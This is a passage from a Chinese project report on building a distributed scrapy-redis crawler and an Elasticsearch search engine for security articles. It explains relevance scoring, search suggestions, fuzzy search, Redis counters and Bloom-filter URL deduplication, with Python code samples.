<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.http <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> ArticleItemLoader, SihouArticleItem</span><br><span class="line"><span class="keyword">from</span> ..utils.common <span class="keyword">import</span> get_md5</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A4houSpider</span><span class="params">(RedisSpider)</span>:</span></span><br><span class="line">    name = <span class="string">'sihou'</span></span><br><span class="line">    redis_key = <span class="string">'sihou:start_urls'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># allowed_domains = ['4hou.com']</span></span><br><span class="line">    <span class="comment"># start_urls = ['https://www.4hou.com']</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 爬取的每个url会进入这个函数，会返回response</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        <span class="comment"># types = response.css('div.technology a::attr(href)').extract()</span></span><br><span class="line">        <span class="keyword">for</span> type_url <span class="keyword">in</span> response.css(<span class="string">'div.technology a::attr(href)'</span>).extract(): <span class="comment"># 获取各个分类标签</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">150</span>):</span><br><span class="line">                page = <span class="string">"?page=&#123;&#125;"</span>.format(i)</span><br><span class="line">                <span class="keyword">yield</span> Request(url=type_url + page, callback=self.parse_post)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_post</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        <span class="comment"># 解析列表页中的所有文章url并交给scrapy下载后并进行解析</span></span><br><span class="line">        <span class="keyword">if</span> response.css(<span class="string">'div.main-box'</span>) != []:</span><br><span class="line">            post_nodes = response.css(<span class="string">'div.main-box'</span>)</span><br><span class="line">            <span class="keyword">for</span> post_node <span class="keyword">in</span> post_nodes:</span><br><span class="line">                image_url = post_node.css(<span class="string">'div.new_img img::attr(src)'</span>).extract_first()  <span class="comment"># 图片地址</span></span><br><span class="line">                view_count = post_node.css(<span class="string">'div.read span::text'</span>).extract_first().replace(<span class="string">','</span>, <span class="string">''</span>)  <span class="comment"># 浏览量</span></span><br><span class="line">                praise_count = post_node.css(<span class="string">'div.Praise span::text'</span>).extract_first().replace(<span class="string">','</span>, <span class="string">''</span>)  <span class="comment"># 点赞数</span></span><br><span class="line">                post_url = post_node.css(<span class="string">'div.new_con a::attr(href)'</span>).extract_first()</span><br><span class="line">                <span class="keyword">yield</span> Request(url=post_url,</span><br><span class="line">                              meta=&#123;<span class="string">'front_image_url'</span>: image_url, <span class="string">'view_count'</span>: view_count,</span><br><span class="line">                                    <span class="string">'praise_count'</span>: praise_count&#125;,</span><br><span class="line">                              callback=self.parse_detail)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_detail</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        <span class="comment"># 通过item_loader加载item</span></span><br><span class="line"></span><br><span class="line">        item_loader = ArticleItemLoader(item=SihouArticleItem(), response=response)</span><br><span class="line">        item_loader.add_value(<span class="string">'front_image_url'</span>, [response.meta.get(<span class="string">'front_image_url'</span>, <span class="string">''</span>)])</span><br><span class="line">        item_loader.add_css(<span class="string">'title'</span>, <span class="string">'h1.art_title::text'</span>)  <span class="comment"># 添加css选择器</span></span><br><span class="line">        item_loader.add_value(<span class="string">'url'</span>, response.url)</span><br><span class="line">        item_loader.add_value(<span class="string">'url_object_id'</span>, get_md5(response.url))</span><br><span class="line">        item_loader.add_css(<span class="string">'create_date'</span>, <span class="string">'div.art_time span:nth-child(3)::text'</span>)</span><br><span class="line">        item_loader.add_value(<span class="string">'view_count'</span>, response.meta.get(<span class="string">'view_count'</span>, <span class="string">'0'</span>))</span><br><span class="line">        item_loader.add_css(<span class="string">'author'</span>, <span class="string">'span.sir::text'</span>)</span><br><span class="line">        item_loader.add_value(<span class="string">'praise_count'</span>, response.meta.get(<span class="string">'praise_count'</span>, <span class="string">'0'</span>))</span><br><span class="line">        item_loader.add_css(<span class="string">'content'</span>, <span class="string">'div.article_cen'</span>)</span><br><span class="line">        item_loader.add_css(<span class="string">'tags'</span>, <span class="string">'span.lei::text'</span>)</span><br><span class="line"></span><br><span class="line">        article_item = item_loader.load_item()</span><br><span class="line">        <span class="keyword">yield</span> article_item  <span class="comment"># 传递到pipelines</span></span><br></pre></td></tr></table></figure>
<h2 id="3-3-重构分布式爬虫"><a href="#3-3-重构分布式爬虫" class="headerlink" title="3.3 重构分布式爬虫"></a>3.3 重构分布式爬虫</h2><h3 id="3-3-1-需要解决的问题"><a href="#3-3-1-需要解决的问题" class="headerlink" title="3.3.1 需要解决的问题"></a>3.3.1 需要解决的问题</h3><p>原来的Scrapy是不支持分布式的，我们知道Scrapy在进行爬虫爬取网站时，会在内存中维护一个Request队列，首先将start_urls放入该队列中，然后在爬取的过程中，不断的将URL插入该队列或从队列中取出。除此之外，Scrapy还需要维护一个去重队列，用来对爬取的URL进行去重操作。</p>
<p>所以，若要将我们的Scrapy项目重构为分布式的项目，主要需要解决的问题就是下面两个：</p>
<ul>
<li><p>Request 队列集中管理：scheduler以队列形式存储在内存中，而其他服务器无法拿到当前服务器内存中的内容。</p>
</li>
<li><p>scrapy的去重队列也是放在内存中，如何对去重队列进行集中管理。</p>
</li>
</ul>
<h3 id="3-3-2-分布式的原理"><a href="#3-3-2-分布式的原理" class="headerlink" title="3.3.2 分布式的原理"></a>3.3.2 分布式的原理</h3><p>实际上使用Scrapy进行分布式爬虫的编写并不是特别复杂，其原理及思路主要如下：</p>
<p>（1）把自己的核心服务器称为master，而把用于跑爬虫程序的机器称slave。</p>
<p>（2）采用scrapy框架抓取网页，我们需要首先给定它一些start_urls，爬虫首先访问start_urls里面的url，再根据我们的具体逻辑，对里面的元素、或者是其他的二级、三级页面进行抓取。而要实现分布式，我们只需要在这个starts_urls里面做文章就行了。</p>
<p>（3）我们在master上搭建一个redis数据库（只用作url的存储，不关心爬取的具体数据），并对每一个需要爬取的网站类型，都开辟一个单独的列表字段。</p>
<p>（4）这样尽管有多个slave，我们都可以设置其scrapy-redis从master的redis服务器中获取url。实际上除了url，scrapy-redis还会在redis服务器上存储去重队列，以及一个items数据库。</p>
<p>（5）程序移植性强，把slave上的程序移植到另一台机器上运行非常的简单。</p>
<p>Scrapy-Redis分布式爬虫的大致原理图如下：</p>
<p><img src="/2020/06/22/ISASearch/73a5a0c704739cfef8d87b3c0f75b9d9.png" alt></p>
<h3 id="3-3-3-分布式的实现"><a href="#3-3-3-分布式的实现" class="headerlink" title="3.3.3 分布式的实现"></a>3.3.3 分布式的实现</h3><p>针对于本项目中，Scrapy-Redis分布式爬虫的实现思路如下：</p>
<p>（1）使用两台机器，一台是win10(本机)，一台是(ubuntu)，分别在两台机器上部署scrapy来进行分布式抓取一个网站</p>
<p>（2）Win10作为Master，开启redis服务，同时也作为一个slave进行抓取；Ubuntu作为一个slave来进行抓取，两台机器的爬虫均从redis服务端中获取url。</p>
<p>（3）master的爬虫运行时会把提取到的url封装成request放到redis中的数据库，并且从该数据库中不断的提取request后下载网页，再把网页的内容存放到redis的另一个items数据库中。</p>
<p>（4）slave从master的redis中取出待抓取的request，下载完网页之后就把网页的内容发送回master的redis。</p>
<p>（5）重复上面的3和4，直到master的redis中的request数据库为空，再把master的redis中的items数据库写入到Mysql数据库中。</p>
<p>（6）Raster里的reids还有一个dupefilter数据库，用来存储抓取过的url的指纹（使用哈希函数将url运算后的结果），用来去重的。</p>
<p>具体代码实现，首先要重构的是Scrapy的spider，即需要将原来爬虫类继承Scrapy-redis的RedisSpider类：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySpider</span><span class="params">(RedisSpider)</span>:</span></span><br><span class="line">    name = <span class="string">'myspider'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        <span class="comment"># do stuff</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>除此之外，还需要再setting.py中进行一些分布式的设置，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Enables scheduling storing requests queue in redis.</span></span><br><span class="line">SCHEDULER = <span class="string">"scrapy_redis.scheduler.Scheduler"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ensure all spiders share same duplicates filter through redis.</span></span><br><span class="line">DUPEFILTER_CLASS = <span class="string">"scrapy_redis.dupefilter.RFPDupeFilter"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Store scraped item in redis for post-processing.</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="string">'scrapy_redis.pipelines.RedisPipeline'</span>: <span class="number">300</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本项目的具体配置，可见源代码setting.py。</p>
<h2 id="3-4-搜索引擎"><a href="#3-4-搜索引擎" class="headerlink" title="3.4 搜索引擎"></a>3.4 搜索引擎</h2><p>对于搜索引擎的使用，首先要明确以下两个问题：</p>
<p>（1）我们对于搜索引擎需求：</p>
<ul>
<li><p>高效</p>
</li>
<li><p>零配置、完全免费</p>
</li>
<li><p>能够简单通过json和http与搜索引擎交互</p>
</li>
<li><p>搜索服务器稳定</p>
</li>
<li><p>能够简单的将一台服务器扩展到上百</p>
</li>
</ul>
<p>（2）为什么不能用传统的关系数据库完成搜索功能</p>
<ul>
<li><p>无法打分</p>
</li>
<li><p>无分布式</p>
</li>
<li><p>无法解析请求搜索</p>
</li>
<li><p>效率低</p>
</li>
<li><p>需要单独实现分词</p>
</li>
</ul>
<h3 id="3-4-1-倒排索引"><a href="#3-4-1-倒排索引" class="headerlink" title="3.4.1 倒排索引"></a>3.4.1 倒排索引</h3><p>倒排索引(Inverted index)，也常被称为反向索引、置入档案或反向档案，是一种索引方法，被用来存储在全文搜索下某个单词在一个文档或者一组文档中的存储位置的映射。它是文档检索系统中最常用的数据结构。</p>
<p>以英文为例子，加上要索引的文本如下：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">T_0</span>=<span class="string">"It is what it is"</span></span><br><span class="line"><span class="attr">T_1</span>=<span class="string">"what is it"</span></span><br><span class="line"><span class="attr">T_2</span>=<span class="string">"it is a banana"</span></span><br></pre></td></tr></table></figure>
<p>若使用传统的正向索引，即索引如下：</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">Docs=&#123;</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="string">"It is what it is"</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="string">"what is it"</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="string">"it is a banana"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而使用倒排索引，索引如下：</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="string">"a"</span>: &#123;2&#125;</span><br><span class="line"><span class="string">"banana"</span>: &#123;2&#125;</span><br><span class="line"><span class="string">"is"</span>: &#123;0, 1, 2&#125;</span><br><span class="line"><span class="string">"it"</span>: &#123;0, 1, 2&#125;</span><br><span class="line"><span class="string">"what"</span>: &#123;0, 1&#125;</span><br></pre></td></tr></table></figure>
<p>另外，倒排索引待解决问题如下：</p>
<ul>
<li><p>大小写转换问题，如 python 和 PYTHON 应该为一个词</p>
</li>
<li><p>词干抽取，looking 和 look 应该处理为一个词</p>
</li>
<li><p>分词</p>
</li>
<li><p>倒排索引文件过大，压缩编码</p>
</li>
</ul>
<h3 id="3-4-2-排序评分"><a href="#3-4-2-排序评分" class="headerlink" title="3.4.2 排序评分"></a>3.4.2 排序评分</h3><p>​<br>使用ElasticSearch时，对于查询出的文档无疑会有文档相似度之别。而理想的排序是和查询条件相关性越高排序越靠前，而这个排序的依据就是_score。</p>
<p>Elasticsearch使用布尔模型查找匹配文档，并用一个名为实用评分函数的公式来计算相关度。这个公式借鉴了词频/逆向文档频率(TF-IDF)和向量空间模型，同时也加入了一些现代的新特性，如协调因子、字段长度归一化以及词或查询语句权重提升，公式如下：</p>
<p><img src="/2020/06/22/ISASearch/4f2ec78933218eac24cb9c48ae3e775f.png" alt></p>
<p><img src="/2020/06/22/ISASearch/621b4af6c2228811f2c3ce91b0ff1b87.png" alt></p>
<p>对上述公式中的部分概念进行如下解释：</p>
<p>（1）词频（Term frequency）</p>
<p>语在文档中出现的频度是多少，频度越高，权重越大。一个5次提到同一词语的字段比一个只有1次提到的更相关。词频的计算方式如下：</p>
<p>$$<br>tf(t\ in\ d)\  = \sqrt{\text{frequency}}<br>$$</p>
<p>词语t在文件d的词频（tf）是这个词语在文档中出现次数的平方根。</p>
<p>（2）逆向文档频率（Inverse document frequency）</p>
<p>词语在集合所有文档里出现的频次。频次越高，权重越低。常用词如and或the对于相关度贡献非常低，因为他们在多数文档中都会出现，一些不常见词语如elastic或lucene可以帮助我们快速缩小范围找到感兴趣的文档。逆向文档频率的计算公式如下：</p>
<p>$$<br>idf(t)\  = \ 1\  + \ log\ (\ numDocs\ /\ (docFreq\  + \ 1))\<br>$$</p>
<p>词语t的逆向文档频率（Inverse document frequency）是：索引中文档数量除以所有包含该词语文档数量后的对数值。</p>
<p>（3）字段长度正则值（Field-length norm）</p>
<p>字段的长度是多少，字段越短，字段的权重越高。如果词语出现在类似标题title这样的字段，要比它出现在内容body这样的字段中的相关度更高。字段长度的正则值公式如下：</p>
<p>$$<br>norm(d)\  = \ 1\ /\ \sqrt{\text{numTerms}}<br>$$</p>
<p>字段长度正则值是字段中词语数平方根的倒数。</p>
<p>（4）查询正则因子（Query Normalization Factor）</p>
<p>查询正则因子（queryNorm）试图将查询正则化，这样就能比较两个不同查询结果。尽管查询正则值的目的是为了使查询结果之间能够相互比较，但是它并不十分有效，因为相关度分数_score的目的是为了将当前查询的结果进行排序，比较不同查询结果的相关度分数没有太大意义。</p>
<p>（5）查询协调（Query Coordination）</p>
<p>协调因子（coord）可以为那些查询词语包含度高的文档提供“奖励”，文档里出现的查询词语越多，它越有机会成为一个好的匹配结果。</p>
<h3 id="3-4-3-搜索提示"><a href="#3-4-3-搜索提示" class="headerlink" title="3.4.3 搜索提示"></a>3.4.3 搜索提示</h3><p>在本项目中为了更加模拟成熟搜索引擎的模式，并且方便用户的查询，加入了搜索提示的功能，所要达到的效果如下，即当用户输入搜索关键词后，搜索框下方会实时显示根据此关键词所相关联的结果。</p>
<p><img src="/2020/06/22/ISASearch/798c162ba1d374a47066d88b04e3dd88.png" alt></p>
<p>要实现此功能，需要利用到ElasticSearch中的suggest用法：</p>
<ul>
<li><p>首先需要在每个mapping中增加一个suggest字段类型为Completion。</p>
</li>
<li><p>在items.py中为每个类增加suggest字段，创建一个函数（gen_suggests）来生成suggest的数组（可以使用_analyze接口自动分词获得相应的关键词数组)，并且可以对搜索字段设置权重weight。</p>
</li>
</ul>
<p>gen_suggests函数的实现代码如下：</p>
<p><img src="/2020/06/22/ISASearch/0135e683eaef668456d1242860011c16.png" alt></p>
<p>使用_analyze接口自动分词调试结果如下：</p>
<p><img src="/2020/06/22/ISASearch/5588df9024e8f1bc3ca53900d5fe8a3c.png" alt="在这里插入图片描述"></p>
<h3 id="3-4-4-模糊搜索"><a href="#3-4-4-模糊搜索" class="headerlink" title="3.4.4 模糊搜索"></a>3.4.4 模糊搜索</h3><p>模糊搜索即根据用户输入的搜索关键词，返回与其最相关的搜索内容。模糊搜索的实现主要是根据编辑距离来判断。</p>
<p>编辑距离是一种字符串之间相似程度的计算方法，即两个字符串之间的编辑距离等于使一个字符串变成另一个字符串而需要进行插入、删除、替换、相邻字符串交换位置四种操作的最少次数。例如，Linux与linx的编辑距离是1，它们之间的变换只需要进行1步操作。关于编辑距离的求法，普遍采用的是动态规划。</p>
<p>在ElasticSearch中需要设置：</p>
<ul>
<li><p>Fuzziness：表示最小编辑距离，小于最小编辑距离的可以模糊搜索到，可设置为AUTO。</p>
</li>
<li><p>prefix_length：前边不参与模糊查询的词长度为多少。例如在查询footbal时，若该参数设为3，则foatball将不能匹配到。</p>
</li>
</ul>
<h2 id="3-5-网页搭建"><a href="#3-5-网页搭建" class="headerlink" title="3.5 网页搭建"></a>3.5 网页搭建</h2><p>由于Web开发的知识，并不是本课程设计的主要考察点，且报告长度有限，因此具体的网站开发流程将不在报告中体现。本节内容将对网站开发中所涉及到的爬虫、分布式及搜索服务设计的问题进行阐述。</p>
<h3 id="3-5-1-爬虫统计数据"><a href="#3-5-1-爬虫统计数据" class="headerlink" title="3.5.1 爬虫统计数据"></a>3.5.1 爬虫统计数据</h3><p>在网站中，我们预计在侧边加上分布式爬虫对各个网站所爬取的文章数量，效果如下：</p>
<p><img src="/2020/06/22/ISASearch/24e0b339151583efc1d431d82a91d4ca.png" alt></p>
<p>传统的思路是每次显示时，进行一次数据数量的查询，但是这样显然会降低网站的加载速率。本项目中采取一种更有效率的方式，即利用Redis实现。具体来说：每个爬虫在redis中维护一个全局变量，每次存储一个数据时就在redis中对一个全局变量加一。最后显示的时候，从redis中读取该变变量即可获得统计数据，这样就避免了每次都去检索。</p>
<p>演示效果如下：</p>
<p><img src="/2020/06/22/ISASearch/3f26b142cab767a75dbd0220b6e33ea8.png" alt="在这里插入图片描述"></p>
<h3 id="3-5-2-热门搜索"><a href="#3-5-2-热门搜索" class="headerlink" title="3.5.2 热门搜索"></a>3.5.2 热门搜索</h3><p>本项目的文章搜索网站中另一个比较重要的功能即为“热门搜索”，即将用户搜索次数最多的关键词列举出来。这实际上是一个Top n问题，利用Redis也是可以非常简单高效的实现。</p>
<p>具体实现方法为在Redis中创建一个可排序列表，每次当用户查询一个关键词时，就将其加到列表中，同时加上相应的分数，最后取得时候按分数排序即可取出热门搜索。</p>
<p>另外，还有“我的搜索”功能，此功能实现较为简单，直接利用前端Javascript即可实现。</p>
<p>效果图如下：</p>
<p><img src="/2020/06/22/ISASearch/0fa89b48a4427fa33c619abf4e616e6b.png" alt></p>
<h2 id="3-6-其他技术"><a href="#3-6-其他技术" class="headerlink" title="3.6 其他技术"></a>3.6 其他技术</h2><h3 id="3-6-1-URL去重策略"><a href="#3-6-1-URL去重策略" class="headerlink" title="3.6.1 URL去重策略"></a>3.6.1 URL去重策略</h3><p>在分布式爬虫系统中面临的各种复杂的挑战中，除了分布式任务的调度、分布式系统中负载均衡等，分布式系统中URL去重更是非常重要的一点。分布式系统中URL去重算法影响着系统的效率，面对上百亿的URL设计一个优秀的去重算法能提高整个系统的性能。</p>
<p>目前的爬虫系统对于URL的去重策略主要有以下几种：</p>
<ul>
<li><p>将访问过的URL保存到数据库中；</p>
</li>
<li><p>将访问过的URL保存到set中，只需要O(1)的代价就可以查询URL；</p>
</li>
<li><p>URL经过md5等方法哈希后保存到set中(scrapy-redis默认)</p>
</li>
<li><p>用bitmap方法将访问过的URL通过hash函数映射到某一位。</p>
</li>
<li><p>bloomfilter方法对bitmap进行改进，多重hash函数降低冲突。</p>
</li>
</ul>
<p>Scrapy框架使用的默认去重策略是上述的第三种方式，即使用sha1算法，对每一个request对象加密，生成40位十六进制数，并且scrapy的去重默认会保存到内存中，如果任务重启，会导致内存中所有去重队列消失。</p>
<p>而我们在将项目重构为分布式爬虫系统后，Scrapy-Redis重写了Scrapy的调度器和去重队列，所以需要在settings中修改如下两列:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Enables scheduling storing requests queue in redis.</span></span><br><span class="line">SCHEDULER = <span class="string">"scrapy_redis.scheduler.Scheduler"</span></span><br><span class="line"><span class="comment"># Ensure all spiders share same duplicates filter through redis.</span></span><br><span class="line">DUPEFILTER_CLASS = <span class="string">"scrapy_redis.dupefilter.RFPDupeFilter"</span></span><br></pre></td></tr></table></figure>
<p>我们可以稍微分析一下Scrapy-Redis的去重重要代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_seen</span><span class="params">(self, request)</span>:</span></span><br><span class="line">    <span class="string">"""Returns True if request was already seen.</span></span><br><span class="line"><span class="string">    Parameters</span></span><br><span class="line"><span class="string">    ----------</span></span><br><span class="line"><span class="string">    request : scrapy.http.Request</span></span><br><span class="line"><span class="string">    Returns</span></span><br><span class="line"><span class="string">    -------</span></span><br><span class="line"><span class="string">    bool</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    fp = self.request_fingerprint(request)</span><br><span class="line">    <span class="comment"># This returns the number of values added, zero if already exists.</span></span><br><span class="line">    added = self.server.sadd(self.key, fp)</span><br><span class="line">    <span class="keyword">return</span> added == <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_fingerprint</span><span class="params">(self, request)</span>:</span></span><br><span class="line">    <span class="string">"""Returns a fingerprint for a given request.</span></span><br><span class="line"><span class="string">    Parameters</span></span><br><span class="line"><span class="string">    ----------</span></span><br><span class="line"><span class="string">    request : scrapy.http.Request</span></span><br><span class="line"><span class="string">    Returns</span></span><br><span class="line"><span class="string">    -------</span></span><br><span class="line"><span class="string">    str</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> request_fingerprint(request)</span><br></pre></td></tr></table></figure>
<p>首先拿到scrapy.http.Request会先调用self.request_fingerprint去计算，也就是scrapy的sha1算法去哈希，然后会向redis中添加该指纹。该函数的作用是：计算该请求指纹，添加到redis的去重队列，如果已经存在该指纹，返回True。</p>
<p>我们可以看到，只要有在settings中添加DUPEFILTER_CLASS = “scrapy_redis.dupefilter.RFPDupeFilter”，就会在redis中新加一列去重队列，这样左的优缺点如下：</p>
<ul>
<li><p>优点：将内存中的去重队列序列化到redis中，及时爬虫重启或者关闭，也可以再次使用，你可以使用SCHEDULER_PERSIST来调整缓存</p>
</li>
<li><p>缺点：如果你需要去重的指纹过大，redis占用空间过大。8GB=8589934592Bytes，平均一个去重指纹40Bytes，约可以存储214,748,000个(2亿)。所以在做关系网络爬虫中，序列化到redis中可能并不是很好，保存在内存中也不好，所以就产生了布隆过滤器。</p>
</li>
</ul>
<h3 id="3-6-2-Bloom-Filter使用"><a href="#3-6-2-Bloom-Filter使用" class="headerlink" title="3.6.2 Bloom Filter使用"></a>3.6.2 Bloom Filter使用</h3><p>上一小节的最后提到了布隆过滤器（Bloom Filter），这是一种目前来看效率较高、对内存消耗也较少的URL去重策略。它的算法原创建一个 m 位的BitSet，先将所有位初始化为0，然后选择 k 个不同的哈希函数。第 i 个哈希函数对字符串 str 哈希的结果记为 h(i, str)，且 h(i, str) 的范围是 0~m-1。</p>
<p>Bloom Filter的操作主要如下两种：</p>
<p>（1）Bloom Filter加入字符串</p>
<p>对于字符串str，分别计算h (1, str) ，h (2, str)…(k, str)。然后将BitSet的第h(1, str)、h(2, str)…(k, str)位设为1，这样字符串str映射到了BitSet中的k个二进制位了。</p>
<p>原理图如下：</p>
<p><img src="/2020/06/22/ISASearch/d51331ad96e750f2d45799afe68a8ac5.png" alt></p>
<p>（2）检测字符串是否存在</p>
<p>对于字符串str，分别计算h(1，str)，h(2，str)…(k，str)。然后检查BitSet的第h(1, str)、h(2, str)…h(k, str)位是否为1,若其中任何一位不为1则可以判定str一定没有被记录过。若全部位都是1，则“认为”字符串str存在。</p>
<p>若一个字符串对应的Bit不全为1,则可以肯定该字符串一定没有被Bloom Filter记录过，因为字符串被记录过，其对应的二进制位肯定全部被设为1了。</p>
<p>但是若一个字符串对应的Bit全为1,实际上是不能100%的肯定该字符串被Bloom Filter记录过的，因为有可能该字符串的所有位都刚好是被其他字符串所对应。这种将该字符串划分错的情况，称为False Positive。</p>
<p>Bloom Filter的具体实现代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PyBloomFilter</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 内置100个随机种子</span></span><br><span class="line">    SEEDS = [<span class="number">543</span>, <span class="number">460</span>, <span class="number">171</span>, <span class="number">876</span>, <span class="number">796</span>, <span class="number">607</span>, <span class="number">650</span>, <span class="number">81</span>, <span class="number">837</span>, <span class="number">545</span>, <span class="number">591</span>, <span class="number">946</span>, <span class="number">846</span>, <span class="number">521</span>, <span class="number">913</span>, <span class="number">636</span>, <span class="number">878</span>, <span class="number">735</span>, <span class="number">414</span>, <span class="number">372</span>,</span><br><span class="line">             <span class="number">344</span>, <span class="number">324</span>, <span class="number">223</span>, <span class="number">180</span>, <span class="number">327</span>, <span class="number">891</span>, <span class="number">798</span>, <span class="number">933</span>, <span class="number">493</span>, <span class="number">293</span>, <span class="number">836</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">544</span>, <span class="number">924</span>, <span class="number">849</span>, <span class="number">438</span>, <span class="number">41</span>, <span class="number">862</span>, <span class="number">648</span>, <span class="number">338</span>,</span><br><span class="line">             <span class="number">465</span>, <span class="number">562</span>, <span class="number">693</span>, <span class="number">979</span>, <span class="number">52</span>, <span class="number">763</span>, <span class="number">103</span>, <span class="number">387</span>, <span class="number">374</span>, <span class="number">349</span>, <span class="number">94</span>, <span class="number">384</span>, <span class="number">680</span>, <span class="number">574</span>, <span class="number">480</span>, <span class="number">307</span>, <span class="number">580</span>, <span class="number">71</span>, <span class="number">535</span>, <span class="number">300</span>, <span class="number">53</span>,</span><br><span class="line">             <span class="number">481</span>, <span class="number">519</span>, <span class="number">644</span>, <span class="number">219</span>, <span class="number">686</span>, <span class="number">236</span>, <span class="number">424</span>, <span class="number">326</span>, <span class="number">244</span>, <span class="number">212</span>, <span class="number">909</span>, <span class="number">202</span>, <span class="number">951</span>, <span class="number">56</span>, <span class="number">812</span>, <span class="number">901</span>, <span class="number">926</span>, <span class="number">250</span>, <span class="number">507</span>, <span class="number">739</span>, <span class="number">371</span>,</span><br><span class="line">             <span class="number">63</span>, <span class="number">584</span>, <span class="number">154</span>, <span class="number">7</span>, <span class="number">284</span>, <span class="number">617</span>, <span class="number">332</span>, <span class="number">472</span>, <span class="number">140</span>, <span class="number">605</span>, <span class="number">262</span>, <span class="number">355</span>, <span class="number">526</span>, <span class="number">647</span>, <span class="number">923</span>, <span class="number">199</span>, <span class="number">518</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># capacity是预先估计要去重的数量</span></span><br><span class="line">    <span class="comment"># error_rate表示错误率</span></span><br><span class="line">    <span class="comment"># conn表示redis的连接客户端</span></span><br><span class="line">    <span class="comment"># key表示在redis中的键的名字前缀</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, capacity=<span class="number">1000000000</span>, error_rate=<span class="number">0.00000001</span>, conn=None, key=<span class="string">'BloomFilter'</span>)</span>:</span></span><br><span class="line">        self.m = math.ceil(capacity * math.log2(math.e) * math.log2(<span class="number">1</span> / error_rate))  <span class="comment"># 需要的总bit位数</span></span><br><span class="line">        self.k = math.ceil(math.log1p(<span class="number">2</span>) * self.m / capacity)  <span class="comment"># 需要最少的hash次数</span></span><br><span class="line">        self.mem = math.ceil(self.m / <span class="number">8</span> / <span class="number">1024</span> / <span class="number">1024</span>)  <span class="comment"># 需要的多少M内存</span></span><br><span class="line">        self.blocknum = math.ceil(self.mem / <span class="number">512</span>)  <span class="comment"># 需要多少个512M的内存块,value的第一个字符必须是ascii码，所有最多有256个内存块</span></span><br><span class="line">        self.seeds = self.SEEDS[<span class="number">0</span>:self.k]</span><br><span class="line">        self.key = key</span><br><span class="line">        self.N = <span class="number">2</span> ** <span class="number">31</span> - <span class="number">1</span></span><br><span class="line">        self.redis = conn</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        name = self.key + <span class="string">"_"</span> + str(ord(value[<span class="number">0</span>]) % self.blocknum)</span><br><span class="line">        hashs = self.get_hashs(value)</span><br><span class="line">        <span class="keyword">for</span> hash <span class="keyword">in</span> hashs:</span><br><span class="line">            self.redis.setbit(name, hash, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_exist</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        name = self.key + <span class="string">"_"</span> + str(ord(value[<span class="number">0</span>]) % self.blocknum)</span><br><span class="line">        hashs = self.get_hashs(value)</span><br><span class="line">        exist = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> hash <span class="keyword">in</span> hashs:</span><br><span class="line">            exist = exist &amp; self.redis.getbit(name, hash)</span><br><span class="line">        <span class="keyword">return</span> exist</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_hashs</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        hashs = list()</span><br><span class="line">        <span class="keyword">for</span> seed <span class="keyword">in</span> self.seeds:</span><br><span class="line">            hash = mmh3.hash(value, seed)</span><br><span class="line">            <span class="keyword">if</span> hash &gt;= <span class="number">0</span>:</span><br><span class="line">                hashs.append(hash)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hashs.append(self.N - hash)</span><br><span class="line">        <span class="keyword">return</span> hashs</span><br><span 